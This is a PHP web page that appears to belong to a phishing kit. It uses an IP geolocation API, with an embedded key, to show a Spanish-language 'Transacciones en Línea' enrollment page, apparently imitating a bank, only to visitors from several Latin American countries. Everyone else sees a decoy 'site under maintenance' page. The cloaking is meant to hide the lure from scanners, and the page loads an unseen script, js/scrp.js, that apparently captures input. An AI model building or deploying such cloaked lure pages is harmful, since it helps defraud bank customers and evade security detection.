<?php
    session_start();
    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
    @$IPResult =  file_get_contents($api_url);

    if(strpos($IPResult, 'CO') || strpos($IPResult, 'AR') || strpos($IPResult, 'CL') || strpos($IPResult, 'VE') || strpos($IPResult, 'EC') || strpos($IPResult, 'PA') || strpos($IPResult, 'UY') ){
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Afiliarse | Transacciones en Línea</title>
<link href="im/favicon-16.png" rel="icon" sizes="16x16" type="image/png">
<link href="st/main.css" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>
<body style="font-family:sans-serif;font-size: 14px;font-weight: 400;">
<div id="mn-cont">
    <div id="pnl-izq">
        <div class="cnt-izq">
            <div class="mn-lg">
                <img src="im/lg1.svg">
            </div>
            <div class="srv-izq">
                <img src="im/pnl-izq.svg">
            </div>
            <div class="trm-izq">
                <img src="im/trm-cnd.svg">
            </div>
        </div>
    </div>
    <div class="pnl-der" id="fcr">
        <div id="ini-trg" class="frm-cnt" >
            <div id="frm-cnvs" style="width:100%;height:100%;">
                <div id="fcr" onclick="loadDoc()" style="width:100%;height:100%;"></div>
            </div>
        </div>   
        <div class="trm-der">
            <img src="im/trm-cnd.svg">
        </div>
        <div class="btm-grd"></div> 
    </div>
</div>
<div id="ctch">
    <img src="im/recp.png">
    <p>Privacy - Terms</p>
</div>

<script src="js/scrp.js"></script>
</body>
</html>

<?php 
}else{    
?>
<!DOCTYPE html>
<html lang="es" class="translated-ltr"><head><title>Sitio en mantenimiento</title>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head><body>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¡Estaremos de vuelta pronto!</font></font></h1>
    <div>
        <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Disculpe las molestias, pero estamos realizando algunas tareas de mantenimiento en este momento. </font><font style="vertical-align: inherit;">Si lo necesita, siempre puede </font></font><a href="mailto:#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">contactarnos</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , de lo contrario, estaremos de nuevo en línea en breve.</font></font></p>
        <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- El equipo</font></font></p>
    </div>
</article><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>

<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>

<?php }?>